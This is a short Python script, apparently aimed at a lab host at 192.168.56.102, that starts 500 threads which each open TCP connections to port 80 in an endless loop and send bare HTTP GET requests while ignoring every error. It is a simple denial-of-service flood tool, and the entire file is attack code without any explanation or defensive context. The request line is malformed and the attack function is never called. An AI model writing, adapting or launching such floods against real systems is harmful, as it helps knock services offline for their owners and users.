import urllib
from concurrent.futures import ThreadPoolExecutor
from concurrent import futures
import socket
import threading

target = '192.168.56.102'
port = 80

def run():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(('GET /HTTP/1.1\r\n').encode('ascii'), (target, port))
            s.sendto(('Host: ' + target + '\r\n\r\n').encode('ascii'), (target, port))
            s.close()
        except:
            pass

def attack():
    for i in range(500):
        threading.Thread(target=run).start()
